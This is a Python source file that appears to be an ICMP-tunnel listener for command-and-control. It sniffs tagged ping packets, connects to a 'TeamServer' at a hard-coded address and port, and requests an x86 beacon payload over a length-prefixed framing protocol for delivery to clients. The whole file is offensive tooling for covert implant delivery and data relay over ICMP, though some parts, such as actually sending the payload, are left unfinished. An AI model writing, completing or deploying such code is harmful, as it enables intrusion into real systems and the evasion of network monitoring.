import logging
from scapy.all import sniff, send, IP, ICMP, Raw
import struct
import socket
import math

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(message)s")

ICMP_TAG = "RQ47"
TAG_SIZE = len(ICMP_TAG)
ICMP_PAYLOAD_SIZE = 1000
MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996


class Client:
    def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size):
        logging.info(f"[+] Listening for transmission of {expected_inbound_data_size} total bytes, "
                     f"from {client_ip}, ID={icmp_id}, tag={tag}")
        self.client_ip = client_ip
        self.icmp_id = icmp_id
        self.tag = tag
        self.expected_inbound_data_size = expected_inbound_data_size

        self.server_ip = "10.10.10.21"
        self.server_port = 2222

        # data from client. Appended to each packet.
        self.data_from_client = b""
        self.payload = b""

        # need to connect to teamserver RIGHT AWAY
        self.ts_socket_setup()

    def sniffer(self):
        """
        Sniffs for all packets coming in that match the client_ip, icmp_id, tag. If so, does something with them.
        """
        sniff(filter="icmp", prn=self.handle_packet, store=0)

    def handle_packet(self, packet):
        # if packet
        if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
            return

        raw_load = packet[Raw].load
        # Discard anything not prefixed by our TAG
        if not raw_load.startswith(self.tag.encode()):
            return

        client_ip = packet[IP].src
        icmp_id = packet[ICMP].id & 0xFFFF
        icmp_seq = packet[ICMP].seq & 0xFFFF

        logging.info(f"[+] packet seq={icmp_seq} received, from {self.client_ip}, ID={self.icmp_id}, tag={self.tag}")

    def get_payload(self):
        """
        Get payload from TeamServer
        """
        logging.info("[+] Getting Payload from <TeamServerIP>")
        self.ts_send_frame(b"arch=x86")
        self.ts_send_frame(b"pipename=foobar")
        self.ts_send_frame(b"block=100")
        self.ts_send_frame(b"go")
        self.payload = self.ts_recv_frame()
        logging.info(f"[+] Received payload: {self.payload}")

    def send_payload(self):
        """
        Sends payload to teamserver
        """
        if self.payload == b"":
            self.get_payload()

    def ts_recv_frame(self):
        raw_size = self.sock.recv(4)
        logging.info(f"Frame coming from TeamServer: {raw_size}")
        if len(raw_size) < 4:
            raise ConnectionError("Failed to receive frame size.")
        size = struct.unpack('<I', raw_size)[0]

        buffer = b''
        while len(buffer) < size:
            chunk = self.sock.recv(size - len(buffer))
            if not chunk:
                raise ConnectionError("Socket closed before full frame received.")
            buffer += chunk

        return buffer

    def ts_send_frame(self, data: bytes):
        logging.info(f"Frame going to TeamServer: {data}")
        size = len(data)
        self.sock.sendall(struct.pack('<I', size))
        self.sock.sendall(data)

    def ts_socket_setup(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)  # 10 sec timeout
        try:
            self.sock.connect((self.server_ip, self.server_port))
            logging.info(f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}")
        except socket.timeout:
            logging.info(f"[!] Socket timed out - is listener up at {self.server_ip}:{self.server_port}?")
            self.sock.close()
            exit()
        except Exception as e:
            logging.info(f"[-] Connection failed: {e}")
            self.sock.close()
            self.sock = None
            exit()


def go():
    logging.info("[+] Starting ICMP Listener")
    sniff(filter="icmp", prn=packet_filter, store=0)


def packet_filter(packet):
    """
    Filters initial packets
    """
    # check to make sure packet is correct type, has Raw data
    if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
        return

    raw_load = packet[Raw].load
    # Make sure packet has our tag.
    if not raw_load.startswith(ICMP_TAG.encode()):
        return

    # extract data from packet
    client_ip = packet[IP].src
    icmp_id = packet[ICMP].id & 0xFFFF
    icmp_seq = packet[ICMP].seq & 0xFFFF

    # When we see seq=0, that signals “start of a new transfer”
    if icmp_seq == 0:
        logging.info(f"[+] New seq=0 packet received from {client_ip}, ID={icmp_id}")

        # Strip off the 4-byte tag (“RQ47”)
        content = raw_load[len(ICMP_TAG):].rstrip(b"\x00")
        logging.info(f"[+] seq=0 content: {content}")

        # if the client wants the payload, send it.
        if content == b"PAYLOAD":
            logging.info("[+] Client requested beacon payload → sending")
            c = Client(client_ip=client_ip, icmp_id=icmp_id, tag=ICMP_TAG, expected_inbound_data_size=0)
            c.send_payload()
            return

        if len(content) < 4:
            logging.info("[-] seq=0 payload too short to contain length")
            return

        # every other interaction will be here, where it sends a size in seq 0
        expected_inbound_data_size = int.from_bytes(content[:4], "big")
        if expected_inbound_data_size < 0:
            raise ValueError(f"Invalid length={expected_inbound_data_size} in seq=0")

        c = Client(client_ip=client_ip, icmp_id=icmp_id, tag=ICMP_TAG,
                   expected_inbound_data_size=expected_inbound_data_size)
        c.sniffer()


if __name__ == "__main__":
    go()
